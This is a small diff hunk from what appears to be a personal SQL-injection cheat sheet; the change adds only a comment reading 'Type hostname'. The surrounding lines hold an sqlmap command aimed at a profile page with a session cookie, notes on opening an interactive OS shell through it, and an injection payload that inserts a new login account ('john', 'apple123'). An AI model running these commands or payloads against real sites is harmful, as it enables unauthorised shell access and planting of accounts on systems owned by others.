@@ -30,6 +30,8 @@ sqlmap -u http://www.test.com/viewprofile.aspx?id=1" --cookie="msco==; ui-tabs-1
 #It opens up the Interactive OS shell.
 # if ask Y THEN Y THEN Y
 
+# Type hostname
+
 ------------------------------------------------------------------------------------------
 
 blah';insert into login values ('john','apple123'); -- 
